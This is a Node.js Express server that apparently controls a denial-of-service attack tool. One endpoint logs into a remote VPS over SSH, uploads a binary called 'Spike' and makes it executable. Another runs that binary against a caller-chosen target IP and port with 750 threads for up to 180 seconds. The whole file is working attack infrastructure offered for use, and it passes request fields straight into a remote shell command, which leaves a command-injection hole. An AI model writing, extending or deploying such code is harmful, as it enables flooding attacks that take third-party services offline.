const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { exec } = require('child_process');
const Client = require('ssh2').Client;

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Root route
app.get('/', (req, res) => {
    res.send('Backend is running!');
});

let isVPSSetup = false;
const PACKET_SIZE = 1024; // Predefined packet size
const THREADS = 750; // Predefined threads
const BINARY_NAME = 'Spike'; // Binary name

// Endpoint to set up VPS
app.post('/setup-vps', (req, res) => {
    const { ip, username, password } = req.body;

    if (!ip || !username || !password) {
        return res.status(400).json({ message: 'IP, username, and password are required!' });
    }

    const conn = new Client();
    conn.on('ready', () => {
        console.log('SSH Connection Established');
        isVPSSetup = true;

        // Upload binary file
        conn.sftp((err, sftp) => {
            if (err) {
                console.error('SFTP Error:', err);
                return res.status(500).json({ message: 'Failed to upload binary!' });
            }

            sftp.fastPut(`./${BINARY_NAME}`, `./${BINARY_NAME}`, (err) => {
                if (err) {
                    console.error('File Upload Error:', err);
                    return res.status(500).json({ message: 'Failed to upload binary!' });
                }

                console.log('Binary file uploaded successfully!');

                // Set executable permission for Spike
                conn.exec(`chmod +x ./${BINARY_NAME}`, (err, stream) => {
                    if (err) {
                        console.error('Error setting executable permission:', err);
                        return res.status(500).json({ message: 'Failed to set executable permission!' });
                    }

                    stream.on('close', (code, signal) => {
                        console.log(`Executable permission set with code ${code} and signal ${signal}`);
                        conn.end();
                        res.status(200).json({ message: 'VPS set up successfully!' });
                    }).on('data', (data) => {
                        console.log('Command output:', data.toString());
                    }).stderr.on('data', (data) => {
                        console.error('Command error:', data.toString());
                    });
                });
            });
        });
    }).on('error', (err) => {
        console.error('SSH Connection Error:', err);
        res.status(500).json({ message: 'Failed to connect to VPS!' });
    }).connect({
        host: ip,
        port: 22,
        username: username,
        password: password,
    });
});

// Endpoint to start attack
app.post('/start-attack', (req, res) => {
    const { ip, username, password, targetIp, targetPort, duration } = req.body;

    if (!isVPSSetup) {
        return res.status(400).json({ message: 'VPS not set up!' });
    }

    if (!ip || !username || !password || !targetIp || !targetPort || !duration) {
        return res.status(400).json({ message: 'All fields are required!' });
    }

    if (duration > 180) {
        return res.status(400).json({ message: 'Duration must be 180 seconds or less!' });
    }

    const conn = new Client();
    conn.on('ready', () => {
        console.log('SSH Connection Established');

        // Execute the binary on the VPS
        const command = `./${BINARY_NAME} ${targetIp} ${targetPort} ${duration} ${PACKET_SIZE} ${THREADS}`;
        conn.exec(command, (err, stream) => {
            if (err) {
                console.error('Error executing command:', err);
                res.status(500).json({ message: 'Attack failed!' });
                return;
            }

            stream.on('close', (code, signal) => {
                console.log(`Command exited with code ${code} and signal ${signal}`);
                conn.end();
                if (code === 0) {
                    res.status(200).json({ message: 'Attack finished!' });
                } else {
                    res.status(500).json({ message: 'Attack failed!' });
                }
            }).on('data', (data) => {
                console.log('Command output:', data.toString());
            }).stderr.on('data', (data) => {
                console.error('Command error:', data.toString());
            });
        });
    }).on('error', (err) => {
        console.error('SSH Connection Error:', err);
        res.status(500).json({ message: 'Failed to connect to VPS!' });
    }).connect({
        host: ip,
        port: 22,
        username: username,
        password: password,
    });
});

const PORT = process.env.PORT || 3000; // Use Render's PORT or default to 3000
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
